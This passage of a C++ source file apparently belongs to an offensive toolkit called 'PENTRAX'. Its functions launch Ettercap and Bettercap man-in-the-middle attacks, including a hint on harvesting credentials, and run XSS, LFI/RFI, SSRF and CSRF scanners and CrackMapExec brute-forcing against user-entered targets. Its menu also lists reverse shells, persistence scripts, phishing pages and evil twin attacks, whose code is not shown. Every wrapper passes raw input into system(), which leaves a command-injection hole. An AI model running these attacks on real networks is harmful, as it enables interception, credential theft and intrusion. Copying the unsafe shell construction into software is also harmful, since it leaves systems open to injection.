void ettercap_cli() {
    if (!tool_exists("ettercap")) {
        cout << "\033[1;31m[!] Ettercap is not installed. Install with: sudo apt install ettercap-graphical\033[0m\n";
        return;
    }
    cout << "[+] Launching Ettercap CLI (MITM, requires root)...\n";
    string iface;
    cout << "Interface (e.g. eth0): ";
    cin >> iface;
    cout << "[+] Running: sudo ettercap -T -q -i " << iface << endl;
    string cmd = "sudo ettercap -T -q -i " + iface;
    system(cmd.c_str());
}

void bettercap_menu() {
    if (!tool_exists("bettercap")) {
        cout << "\033[1;31m[!] Bettercap is not installed. Install with: sudo apt install bettercap\033[0m\n";
        return;
    }
    cout << "[Bettercap MITM]\n";
    string iface, channel, caplet;
    cout << "Interface (e.g. wlan0mon or eth0): ";
    cin >> iface;
    cin.ignore();
    cout << "WiFi Channel (optional, press Enter to skip): ";
    getline(cin, channel);
    cout << "Bettercap caplet (e.g. wifi-ap, wifi-recon, press Enter for default): ";
    getline(cin, caplet);
    cout << "[!] To harvest credentials, use caplets like 'wifi-ap', 'http-req-dump', or 'net.sniff'.\n";
    string cmd = "sudo bettercap -iface " + iface;
    if (!channel.empty()) cmd += " -eval 'wifi.channel " + channel + "'";
    if (!caplet.empty()) cmd += " -caplet " + caplet;
    cout << "[+] Running: " << cmd << endl;
    system(cmd.c_str());
}

void advanced_xss_test() {
    if (!tool_exists("xsstrike")) {
        cout << "\033[1;31m[!] XSStrike is not installed. Install with: sudo apt install xsstrike\033[0m\n";
        return;
    }
    cout << "[Advanced XSS Testing]\n";
    cout << "- This module will test a target URL for reflected/stored XSS vulnerabilities.\n";
    string url;
    cout << "Target URL (e.g. http://site.com/page?param=val): ";
    cin >> url;
    if (url.empty()) {
        cout << "[-] No URL provided.\n";
        return;
    }
    cout << "[+] Running XSStrike...\n";
    string cmd = "xsstrike -u '" + url + "'";
    system(cmd.c_str());
}

void advanced_lfi_rfi_test() {
    if (!tool_exists("lfi-suite")) {
        cout << "\033[1;31m[!] LFISuite is not installed. Install with: sudo apt install lfi-suite\033[0m\n";
        return;
    }
    cout << "[Advanced LFI/RFI Testing]\n";
    cout << "- This module will test a target URL/parameter for Local/Remote File Inclusion vulnerabilities.\n";
    string url;
    cout << "Target URL (e.g. http://site.com/page.php?file=home): ";
    cin >> url;
    if (url.empty() || url.find('=') == string::npos) {
        cout << "[-] Please provide a URL with a parameter (e.g. ...?file=home)\n";
        return;
    }
    cout << "[+] Running LFISuite...\n";
    string cmd = "lfi-suite -u '" + url + "'";
    system(cmd.c_str());
}

void advanced_csrf_test() {
    if (!tool_exists("zap.sh")) {
        cout << "\033[1;31m[!] OWASP ZAP is not installed. Install with: sudo apt install zaproxy\033[0m\n";
        return;
    }
    cout << "[Advanced CSRF Testing]\n";
    cout << "- This module will test a target URL for CSRF vulnerabilities.\n";
    string url;
    cout << "Target URL (e.g. http://site.com/form): ";
    cin >> url;
    if (url.empty()) {
        cout << "[-] No URL provided.\n";
        return;
    }
    cout << "[+] Launching OWASP ZAP for automated CSRF scan...\n";
    string cmd = "zap.sh -cmd -quickurl '" + url + "' -quickout zap_csrf_report.html -quickprogress";
    system(cmd.c_str());
    cout << "[+] ZAP scan complete. See zap_csrf_report.html for details.\n";
}

void advanced_web_vuln_scan() {
    if (!tool_exists("nikto")) {
        cout << "\033[1;31m[!] Nikto is not installed. Install with: sudo apt install nikto\033[0m\n";
        return;
    }
    if (!tool_exists("zap.sh")) {
        cout << "\033[1;31m[!] OWASP ZAP is not installed. Install with: sudo apt install zaproxy\033[0m\n";
        return;
    }
    cout << "[Advanced Web Vulnerability Scanner]\n";
    cout << "- This module will scan a target web application for common vulnerabilities.\n";
    string url;
    cout << "Target URL (e.g. http://site.com): ";
    cin >> url;
    if (url.empty()) {
        cout << "[-] No URL provided.\n";
        return;
    }
    bool ran = false;
    cout << "[+] Running Nikto web scanner...\n";
    string cmd = "nikto -h '" + url + "'";
    system(cmd.c_str());
    ran = true;
    cout << "[+] Launching OWASP ZAP for automated scan...\n";
    cmd = "zap.sh -cmd -quickurl '" + url + "' -quickout zap_webscan_report.html -quickprogress";
    system(cmd.c_str());
    cout << "[+] ZAP scan complete. See zap_webscan_report.html for details.\n";
    ran = true;
}

void advanced_ssrf_test() {
    if (!tool_exists("ssrfmap")) {
        cout << "\033[1;31m[!] SSRFmap is not installed. Install with: sudo apt install ssrfmap\033[0m\n";
        return;
    }
    cout << "[Advanced SSRF Testing]\n";
    cout << "- This module will test a target URL/parameter for Server-Side Request Forgery vulnerabilities.\n";
    string url;
    cout << "Target URL (e.g. http://site.com/page?url=...): ";
    cin >> url;
    if (url.empty() || url.find('=') == string::npos) {
        cout << "[-] Please provide a URL with a parameter (e.g. ...?url=...)\n";
        return;
    }
    cout << "[+] Running SSRFmap...\n";
    string cmd = "ssrfmap -u '" + url + "'";
    system(cmd.c_str());
}

void smb_ntlm_ldap_bruteforce() {
    if (!tool_exists("crackmapexec")) {
        cout << "\033[1;31m[!] CrackMapExec is not installed. Install with: sudo apt install crackmapexec\033[0m\n";
        return;
    }
    if (!tool_exists("medusa")) {
        cout << "\033[1;31m[!] Medusa is not installed. Install with: sudo apt install medusa\033[0m\n";
        return;
    }
    cout << "[SMB/NTLM/LDAP Brute-force]\n";
    cout << "- This module attempts brute-force attacks against SMB, NTLM, or LDAP services using CrackMapExec or Medusa.\n";
    string target, username, password, protocol;
    cout << "Target IP/Hostname: ";
    getline(cin, target);
    cout << "Username (or path to userlist): ";
    getline(cin, username);
    cout << "Password (or path to passlist): ";
    getline(cin, password);
    cout << "Protocol (smb/ntlm/ldap): ";
    getline(cin, protocol);
    if (target.empty() || username.empty() || password.empty() || protocol.empty()) {
        cout << "[-] All fields are required.\n";
        return;
    }
    cout << "[+] Running CrackMapExec...\n";
    string cmd = "crackmapexec " + protocol + " " + target + " -u '" + username + "' -p '" + password + "'";
    system(cmd.c_str());
}

// Graceful exit handler
void handle_sigint(int) {
    cout << "\n\033[1;36m[!] Exiting PENTRAX. Stay ethical!\033[0m\n";
    exit(0);
}

void menu() {
    const vector<string> options = {
        "Port Scan",
        "Whois Lookup",
        "HTTP Headers Grabber",
        "Nmap Scan",
        "Hydra Login Bruteforce",
        "SQLMap Injection Scan",
        "Reverse Shell (TCP)",
        "Generate Reverse Shell Payload",
        "Start Listener (Netcat)",
        "Generate Persistence Script",
        "Generate msfvenom Payload",
        "Directory Bruteforce",
        "Subdomain Finder",
        "DNS Lookup",
        "SSL Certificate Info",
        "Crack Hash",
        "CVE Search",
        "OSINT Wordlist Generator",
        "Email Breach Check",
        "Social Media Profile Search",
        "Pastebin/Leak Search",
        "Generate OSINT Report",
        "Social Engineering Toolkit (SET)",
        "Fake Email Spoof (local test)",
        "Phishing Page Generator",
        "WiFi Network Scan",
        "Capture WPA Handshake",
        "Crack WPA Handshake",
        "Deauthentication Attack",
        "Evil Twin AP",
        "Automated WiFi Attack (Wifite)",
        "ARP Spoofing (MITM)",
        "DNS Spoofing (MITM)",
        "Ettercap (CLI)",
        "Bettercap (Full MITM)",
        "Advanced XSS Testing",
        "Advanced LFI/RFI Testing",
        "Advanced CSRF Testing",
        "Advanced Web Vulnerability Scanner",
        "Advanced SSRF Testing",
        "SMB/NTLM/LDAP Brute-force"
    };
    int page = 0;
    int per_page = 10;
    int total_pages = (options.size() + per_page - 1) / per_page;
    while (true) {
        clear_screen();
        banner();
        disclaimer();
        cout << "\033[36m------------------------------------------------------------\033[0m\n";
        int start = page * per_page;
        int end = min((int)options.size(), start + per_page);
        for (int i = start; i < end; ++i) {
            cout << (i+1) << ". " << options[i] << "\n";
        }
        cout << "\033[36m------------------------------------------------------------\033[0m\n";
        cout << "Page " << (page+1) << "/" << total_pages << "  (n=next, p=prev, 0=exit)\n";
        cout << "Select option > ";
        string choice;
        getline(cin, choice);
        if (choice == "n" && page < total_pages-1) {
            page++;
            continue;
        } else if (choice == "p" && page > 0) {
            page--;
            continue;
        } else if (choice == "0") {
            cout << "\033[1;36mExiting...\033[0m\n";
            break;
        }
        int opt = 0;
        try { opt = stoi(choice); } catch (...) { opt = 0; }
        if (opt < 1 || opt > (int)options.size()) {
            cout << "\033[1;31mInvalid option.\033[0m\n";
        } else {
            switch (opt) {
                case 1: port_scan(); break;
                case 2: whois_lookup(); break;
                case 3: http_headers(); break;
                case 4: nmap_scan(); break;
                case 5: hydra_bruteforce(); break;
                case 6: sqlmap_scan(); break;
                case 7: reverse_shell(); break;
                case 8: generate_reverse_shell_payload(); break;
                case 9: start_listener(); break;
                case 10: generate_persistence_script(); break;
                case 11: generate_msfvenom_payload(); break;
                case 12: dir_bruteforce(); break;
                case 13: find_subdomains(); break;
                case 14: dns_lookup(); break;
                case 15: ssl_info(); break;
                case 16: crack_hash(); break;
                case 17: cve_lookup(); break;
                case 18: osint_wordlist_generator(); break;
                case 19: email_breach_check(); break;
                case 20: social_media_search(); break;
                case 21: pastebin_leak_search(); break;
                case 22: osint_report(); break;
                case 23: setoolkit(); break;
                case 24: spoof_email(); break;
                case 25: phishing_page(); break;
                case 26: wifi_scan(); break;
                case 27: wifi_handshake_capture(); break;
                case 28: wifi_crack_handshake(); break;
                case 29: wifi_deauth_attack(); break;
                case 30: evil_twin_ap(); break;
                case 31: wifi_wifite(); break;
                case 32: arp_spoof(); break;
                case 33: dns_spoof(); break;
                case 34: ettercap_cli(); break;
                case 35: bettercap_menu(); break;
                case 36: advanced_xss_test(); break;
                case 37: advanced_lfi_rfi_test(); break;
                case 38: advanced_csrf_test(); break;
                case 39: advanced_web_vuln_scan(); break;
                case 40: advanced_ssrf_test(); break;
                case 41: smb_ntlm_ldap_bruteforce(); break;
                default: cout << "Invalid option.\n"; break;
            }
        }
        cout << "\n\033[1;32mPress Enter to return to menu...\033[0m";
        cin.ignore(numeric_limits<streamsize>::max(), '\n');
    }
}

int main() {
    signal(SIGINT, handle_sigint);
    menu();
    return 0;
} 